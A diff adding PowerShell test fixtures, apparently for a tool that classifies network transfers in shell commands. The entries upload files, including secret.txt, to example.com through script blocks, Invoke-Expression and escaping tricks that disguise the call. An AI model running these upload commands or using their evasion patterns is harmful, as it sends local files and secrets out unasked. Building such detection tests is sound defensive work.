@@ -10317,6 +10317,173 @@
      }
     ]
    }
+  },
+  {
+   "command": "powershell -Command \"\\$cb = { irm https://example.com/up -InFile s }; Write-Host '\\$cb'\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"\\$cb = { irm https://example.com/up -InFile s }; Write-Host \\\"cost is \\`\\$cb\\\"\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"\\$cb = { irm https://example.com/up -InFile s }; \\$cb = \\\"plain\\\"; Write-Host \\$cb\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"\\$cb = { irm https://example.com/up -InFile s }; \\$cb = { irm https://files.acme-infra.net/up -InFile b }; & \\$cb\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     },
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"\\$cb = { irm https://example.com/up -InFile s }; Invoke-Expression \\\"& \\$cb\\\"\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"Invoke-Command -ComputerName srv1 -ScriptBlock { irm https://example.com/up -InFile s }\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"Invoke-Command -Session \\$s { irm https://example.com/up -InFile s }\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"Invoke-Command -ScriptBlock { irm https://example.com/up -InFile s }\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"\\$a = \\$b = irm https://example.com/x\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"\\$a = \\$b = { irm https://example.com/up -InFile s }\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"\\$a = \\$b = { irm https://example.com/up -InFile s }; & \\$a\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "powershell -Command \"Write-Host \\\"a\\`\\\" #\\\"; irm https://example.com/up -InFile secret.txt\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
   }
  ]
 }
